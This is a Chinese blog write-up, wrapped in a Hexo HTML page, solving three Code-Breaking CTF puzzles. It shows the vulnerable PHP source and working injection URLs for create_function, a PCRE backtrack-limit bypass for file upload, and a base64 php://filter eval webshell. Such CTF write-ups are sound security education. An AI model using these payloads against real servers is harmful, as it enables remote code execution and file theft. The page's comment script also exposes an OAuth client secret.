@@ -1,0 +1,722 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>Code-Breaking Puzzles 题解&amp;学习篇(一)</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《Code-Breaking Puzzles 题解&amp;学习篇(一)》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		3/12/2019 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/12/18/Code-Breaking Puzzles 题解&学习篇(一)/" itemprop="url">		
+			Code-Breaking Puzzles 题解&amp;学习篇(一)		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/12/18/Code-Breaking Puzzles 题解&学习篇(一)/" itemprop="url">
+	<time datetime="2018-12-18T08:38:02.796Z" itemprop="datePublished">
+  		2018-12-18
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="Code-Breaking-Puzzles-题解-amp-学习篇-一"><a href="#Code-Breaking-Puzzles-题解-amp-学习篇-一" class="headerlink" title="Code-Breaking Puzzles 题解&amp;学习篇(一)"></a>Code-Breaking Puzzles 题解&amp;学习篇(一)</h2><p>p神真是相当用心了，弄了个知识星球两周年的活动，有一堆题目质量极高的题。大家感兴趣的可以一起来做下</p>
+<p><a href="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a></p>
+<p>比较菜的我就只能学习了。有很多新奇的点，题目确实都很有意思，最后，广告还是要的，欢迎一起加入【代码审计知识星球】</p>
+<p>p神对这几个题目知识点的描述:</p>
+<pre><code>function PHP函数利用技巧
+
+pcrewaf PHP正则特性
+
+phpmagic PHP写文件技巧
+</code></pre><p>我比较菜，一天只能做出来三道题目(QAQ）</p>
+<p>如果各位大佬有好的思路，欢迎指点(THS)</p>
+<h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p>题目源码</p>
+<pre><code>&lt;?php
+$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;
+$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;
+
+if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
+show_source(__FILE__);
+} else {
+$action(&#39;&#39;, $arg);
+}
+</code></pre><p>这一题是p神在知识星球两周年的活动中的第一题</p>
+<p>上来就是一个正则表达式，第一个限制是<code>preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)</code>，<code>$action</code>中要出现数字，字母(a-z）以及下划线以外的字符。</p>
+<p>那么有没有可能在开头或结尾加入某个字符来绕过正则且函数依然能调用呢？这里我们使用burp跑一遍<code>0-128</code>的<code>ascii码</code>，就能知道可以在函数前插入一个<code>\</code></p>
+<p><img src="https://i.imgur.com/dC6ZTjB.png" alt=""></p>
+<p><strong>具体原理,p神在小密圈也说过</strong></p>
+<pre><code>function，为什么函数前面可以加一个%5c？
+
+其实简单的不行，php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，
+
+如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 
+
+这样调用函数，则其实是写了一个绝对路径。
+
+如果你在其他namespace里调用系统类，就必须写绝对路径这种写法
+</code></pre><p>就是<code>\</code>在php中表示默认的命名空间，比如写一些类的时候会在开头写</p>
+<pre><code>1：namespace think\db;
+2：use think\Exception;
+</code></pre><p>然后就是需要找一个第二个参数可以引发危险的函数。<code>create_function</code>比较符合</p>
+<p><code>create_function</code>的第一个参数是参数，第二个参数是内容</p>
+<p>函数结构形似</p>
+<pre><code>create_function(&#39;$a,$b&#39;,&#39;return miraitowa&#39;)
+==&gt;
+function a($a, $b){
+return miraitowa;
+}
+</code></pre><p>然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。</p>
+<pre><code>create_function(&#39;$a,$b&#39;,&#39;return miraitowa;}phpinfo();//&#39;)
+==&gt;
+function a($a, $b){
+return miraitowa;}phpinfo();//
+}
+</code></pre><p>当然你也可以这样理解这一点</p>
+<p><code>create_function</code>在构建函数的时候，也是使用的字符串拼接的方式，将第二个参数的$code传入到其中</p>
+<pre><code>&quot;function lambda(){&quot;.$code.&quot;}&quot;
+</code></pre><p>然后动态执行。这样一来就可以进行注入</p>
+<pre><code>miraitowa;}phpinfo();/*
+</code></pre><p>其实我们非常熟悉的eval也是将其中的字符串与进行拼接</p>
+<pre><code>&quot;&lt;?php &quot;.$code.&quot;?&gt;&quot;
+</code></pre><p>从而可以传入<code>?&gt;、&lt;?php</code>闭合前后的标签，让中间的代码块不会被当作php代码执行。</p>
+<p>到了这里，也就差不多了。虽然系统里禁用了<code>system、exec</code>之类的函数，但是，只要可以读文件就可以拿到flag了</p>
+<pre><code>http://51.158.75.42:8087/?action=\create_function&amp;arg=miraitowa;}print_r(scandir(%27../%27));/*
+</code></pre><p>然后再读取一下目录就可以了</p>
+<p><img src="https://i.imgur.com/VWBSeGo.png" alt=""></p>
+<pre><code>http://51.158.75.42:8087/?action=\create_function&amp;arg=miraitowa;}print_r(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));/*
+</code></pre><p>就可以得到flag了</p>
+<p><strong>深入create_function代码注入</strong></p>
+<p>p神在小密圈具体实例进行讲解</p>
+<p><code>code-breaking</code>的第一题，有一个考点是<code>create_function</code>代码注入。关于这个点，以前我经常看到有人分享一句话木马，</p>
+<p>有的用<code>create_function</code>创建一个函数然后执行，我总是默默地想其实创建完了不用执行的。<code>create_function(&#39;&#39;, $_GET[&#39;code&#39;]);</code> </p>
+<p>我们来看一下上述代码为什么可以直接<code>RCE</code>。 下图摘取出<code>create_function</code>的源代码：</p>
+<p><img src="https://i.imgur.com/XcJqtPw.jpg" alt=""></p>
+<p>可见用户输入的参数是<code>function_args、function_code</code>，他们被拼接成一个完整的PHP函数： </p>
+<p><code>function__lambda_func(function_args){function_code}\0</code>这个函数代码会先放在<code>zend_eval_stringl</code>里执行，</p>
+<p>可以理解为eval。执行成功后，再于函数列表中找到<code>__lambda_func</code>函数，将其重命名成<code>lambda_%d</code>，<code>%d</code>代表<strong>“这是本进程第几个匿名函数”。</strong></p>
+<p>最后从函数列表里删除<code>__lambda_func</code>。 由于代码就是简单的拼接，所以我们可以闭合括号，执行任意代码。</p>
+<p>比如：</p>
+<ol>
+<li><p>如果可控在第一个参数，需要闭合圆括号和大括号：<code>create_function(&#39;){}phpinfo();//&#39;, &#39;&#39;);</code> </p>
+</li>
+<li><p>如果可控在第二个参数，需要闭合大括号：<code>create_function(&#39;&#39;, &#39;}phpinfo();//&#39;);</code> </p>
+</li>
+</ol>
+<p>见下图执行<code>phpinfo</code></p>
+<p><img src="https://i.imgur.com/nlhrByw.png" alt=""></p>
+<h3 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h3><p>题目源码</p>
+<pre><code>&lt;?php
+function is_php($data){
+return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);
+}
+
+if(empty($_FILES)) {
+die(show_source(__FILE__));
+}
+
+$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
+if (is_php($data)) {
+echo &quot;bad request&quot;;
+} else {
+@mkdir($user_dir, 0755);
+$path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;
+move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);
+
+header(&quot;Location: $path&quot;, true, 303);
+} 1
+</code></pre><p>这题思路很清楚，文件名不可控，唯一能控制的就是文件内容。所以问题的症结就在于如何绕过这个正则表达式。</p>
+<pre><code>/&lt;\?.*[(`;?&gt;].*/is
+</code></pre><p>简单来说就是&lt;后面不能有问号，&lt;?后面不能有(;?&gt;反引号，但很显然，这是不可能的，最少执行函数也需要括号才行。从常规的思路肯定不行</p>
+<p>php开发者写的关于<a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">深悉正则(pcre)最大回溯/递归限制</a></p>
+<p>P神写的<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<p>看ph师傅的文章我们看到了问题所在，pcre.backtrack_limit这个配置决定了在php中，正则引擎回溯的层数。而这个值默认是1000000.</p>
+<p>超过后就会导致匹配失败，preg_match返回false。</p>
+<p><img src="https://i.imgur.com/WVxPcHt.png" alt=""></p>
+<p>而什么是正则引擎回溯呢？</p>
+<p>在正则中.*表示匹配任意字符任意位，也就是说他会匹配所有的字符，而正则引擎在解析正则的时候必然是逐位匹配的，对于</p>
+<pre><code>&lt;?php phpinfo();//faaaaaaaaaaaaaaaaaaaaaaaaaa
+</code></pre><p>这段代码来说</p>
+<pre><code>首先&lt;匹配&lt;
+然后?匹配?
+然后.*会直接匹配到结尾php phpinfo();//faaaaaaaaaaaaaaaaaaaaaaaaaa
+紧接着匹配[(`;?&gt;]，问题出现了，上一步匹配到了结尾，后面没有满足要求的符号了。
+从这里开始正则引擎就开始逐渐回溯，知道符合要求的;出现为止
+</code></pre><p>但很显然，服务端不可能不做任何限制，不然如果post一个无限长的数据，那么服务端就会浪费太多的资源在这里，所以就有了</p>
+<p><code>pcre.backtrack_limit</code>，如果回溯次数超过100万次，那么匹配就会结束，然后跳过这句语句。</p>
+<p>回到题目来看，如果能够跳过这句语句，我们就能上传任意文件内容了！</p>
+<p>首先在本地写一个html用来上传文件</p>
+<pre><code>&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://51.158.75.42:8088/&quot; method=&quot;POST&quot;&gt;
+Send this file: &lt;input name=&quot;file&quot; type=&quot;file&quot; /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Send File&quot; /&gt;
+&lt;/form&gt;
+</code></pre><p>随便选一个文件上传，用burp拦截，内容修改成前面提到的形式</p>
+<p><img src="https://i.imgur.com/0P8xkqd.png" alt=""></p>
+<p>从响应来看上传成功，然后就可以执行任意命令了</p>
+<p>用1中提到的方法可以找一下目录下文件，找到后读取即可<code>getflag</code></p>
+<pre><code>payload：pass=readfile(&quot;../../../flag_php7_2_1s_c0rrect&quot;);
+</code></pre><p><img src="https://i.imgur.com/e2Dl6wK.png" alt=""></p>
+<h3 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h3><p>主要源码：</p>
+<pre><code>&lt;?php
+if(isset($_GET[&#39;read-source&#39;])) {
+exit(show_source(__FILE__));
+}
+
+define(&#39;DATA_DIR&#39;, dirname(__FILE__) . &#39;/data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]));
+
+if(!is_dir(DATA_DIR)) {
+mkdir(DATA_DIR, 0755, true);
+}
+chdir(DATA_DIR);
+
+$domain = isset($_POST[&#39;domain&#39;]) ? $_POST[&#39;domain&#39;] : &#39;&#39;;
+$log_name = isset($_POST[&#39;log&#39;]) ? $_POST[&#39;log&#39;] : date(&#39;-Y-m-d&#39;);
+?&gt;
+&lt;?php 
+if(!empty($_POST) &amp;&amp; $domain):
+$command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain));
+$output = shell_exec($command);
+
+$output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);
+
+$log_name = $_SERVER[&#39;SERVER_NAME&#39;] . $log_name;
+if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;], true)) {
+file_put_contents($log_name, $output);
+}
+
+echo $output;
+endif; ?&gt;
+</code></pre><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>1：用<code>sprintf将&quot;dig -t A -q %s&quot;</code>和经过<code>escapeshellarg</code>的<code>$domain</code>(可控)拼接</p>
+<p>这样处理的<code>$domain</code>会变成这样的形式：</p>
+<pre><code>比如，当$domain = ;ls;
+
+$command：dig -t A -q &#39;;ls;&#39;
+
+当$domain = &#39;;ls;
+
+$command：dig -t A -q &#39;&#39;\&#39;&#39;;ls;&#39;
+</code></pre><p>所以这里的<code>shell_exec</code>难以利用</p>
+<pre><code>; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u15-Debian &lt;&lt;&gt;&gt; -t A -q 21344
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 55235
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;21344.                IN    A
+
+;; AUTHORITY SECTION:
+.            10800    IN    SOA    a.root-servers.net. nstld.verisign-grs.com. 2018121702 1800 900 604800 86400
+
+;; Query time: 445 msec
+;; SERVER: 127.0.0.11#53(127.0.0.11)
+;; WHEN: Tue Dec 18 01:57:12 UTC 2018
+;; MSG SIZE  rcvd: 98
+</code></pre><p>2：要经过<code>htmlspecialchars()</code>，这样把尖括号过滤掉了，没法直接写shell</p>
+<p>3：把<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>和可控的<code>log_name</code>拼接起来，用<code>pathinfo</code>判断是否以<code>php</code>为后缀，然后写文件</p>
+<p>看起来似乎是要利用<code>file_put_content</code>s来写<code>shell</code>，但是两个参数(文件和内容)我们似乎都无法完全控制</p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>**膜<a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p>
+<p>第一点是看了一位大佬的文章<a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p>
+<p><img src="https://i.imgur.com/sr0dR5Z.png" alt=""></p>
+<p>只要在后缀名后加上/.，pathinfo就取不到后缀名，且可以正常写入.php之中。</p>
+<p>之前做题的时候曾经遇到过类似的问题，可以通过解base64来隐藏自己要写入的内容绕过过滤，然后php在解析的时候会忽略各种乱码，</p>
+<p>只会从&lt;?php开始，所以其他的乱码都不会影响到内容，唯一要注意的就是base64是4位一解的，主要不要把第一位打乱掉。</p>
+<p>简单测试一下</p>
+<pre><code>$output = &lt;&lt;&lt;EOT
+; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u15-Debian &lt;&lt;&gt;&gt; -t A -q &quot;$domain&quot;
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 43507
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0
+;; QUESTION SECTION:
+;1232321321.IN  A
+;; AUTHORITY SECTION:
+.   10800   IN  SOA a.root-servers.net. nstld.verisign-grs.com. 2018112800 1800 900 604800 86400
+;; Query time: 449 msec
+;; SERVER: 127.0.0.11#53(127.0.0.11)
+;; WHEN: Wed Nov 28 08:26:15 UTC 2018
+;; MSG SIZE  rcvd: 103
+EOT;
+$output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);
+var_dump($output);
+var_dump(base64_decode($output));
+</code></pre><p><img src="https://i.imgur.com/QbYoFCA.png" alt=""></p>
+<p><img src="https://i.imgur.com/F3Pevfh.png" alt=""></p>
+<p><strong>深入$_SERVER[‘SERVER_NAME’]</strong></p>
+<p>由于给了提示说是php文件写入，那就把目光放在了写文件的地方</p>
+<pre><code>$log_name = $_SERVER[&#39;SERVER_NAME&#39;] . $log_name;
+if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;], true)) {
+file_put_contents($log_name, $output);
+}
+</code></pre><p>可以看到，文件名是由<code>$_SERVER[&#39;SERVER_NAME&#39;]和$log_name</code>两部分组成的。</p>
+<p><code>$log_name</code>可以由<code>$_POST[&#39;log&#39;]</code>来控制，至于<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>一开始我是以为不能控制的，后来改了下Host头部发现也是可以控制的，看了下这个参数的含义</p>
+<p><img src="https://i.imgur.com/XnSqVYq.png" alt=""></p>
+<p>可以看到官方也给了相应的提示，在Apache2中没有进行相应设置的话，这个值是会由客户端进行提供。</p>
+<p>这样文件名完全可控之后，事情就变的好办了。后面的if判断也相对比较好绕</p>
+<pre><code>!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;], true)
+</code></pre><p><strong>使用php伪协议</strong></p>
+<p>利用php伪协议就可以控制写入文件的方式，进行本地的测试</p>
+<p><img src="https://i.imgur.com/J8ljpv2.png" alt=""></p>
+<pre><code>&lt;php? @eval($_GET[&#39;c&#39;]);
+</code></pre><p>可以如上文进行写入。</p>
+<p>解码base64时，遇到不合法字符会跳过(至少php和下文例子中的python是这样)base64使用的字符包括大小写字母各26个，加上10个数字，</p>
+<p>和<code>+、/</code>共64个字符。base64在解码时，如果参数中有非法字符（不在上面64个字符内的），就会跳过。</p>
+<p><strong>举个栗子</strong></p>
+<p><img src="https://i.imgur.com/DbUsVtD.png" alt=""></p>
+<p>所以其他字符不会影响想要的解码</p>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p><code>Host</code>改为<code>php</code>，与传入的<code>log</code>拼接成php伪协议的形式，文件名后加/.来绕过<code>pathinfo</code></p>
+<p><code>domain</code>为 <code>&lt;?php @eval($_GET[&#39;123&#39;]);?&gt;</code></p>
+<p>的base64编码，去掉了最后的==（这里php最后的?&gt;不能省略，因为后面还有其他内容)</p>
+<p><img src="https://i.imgur.com/A2Prksw.png" alt=""></p>
+<p><img src="https://i.imgur.com/rEgKbmQ.png" alt=""></p>
+<p>参考资料：</p>
+<p><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+    	<li class="am-pagination-prev">
+   		<a class="pull-left" href="/2018/12/19/搜索技巧总结/" title="搜索技巧总结">
+      		&laquo; 上一篇
+		</a>
+		</li>
+	
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2018/12/16/git学习手册(一)/" title="git学习手册(一)">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+
+  <div id="gitalk-container"></div>
+
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//create gitalk
+	var gitalk = new Gitalk({
+		clientID: '74a83cc9b15a1cf53e10',
+		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
+		//id: window.location.pathname,
+		// id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
+		repo: 'Annie-Gitalk',
+		owner: 'miraitowa',
+		admin: 'miraitowa',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Code-Breaking-Puzzles-题解-amp-学习篇-一"><span class="post-toc-text">Code-Breaking Puzzles 题解&amp;学习篇(一)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#easy-function"><span class="post-toc-text">easy - function</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#easy-pcrewaf"><span class="post-toc-text">easy - pcrewaf</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#easy-phpmagic"><span class="post-toc-text">easy - phpmagic</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析"><span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解题思路"><span class="post-toc-text">解题思路</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#getshell"><span class="post-toc-text">getshell</span></a></li></ol></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018 11 11 - 2019, content by miraitowa. All Rights Reserved.			       	
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
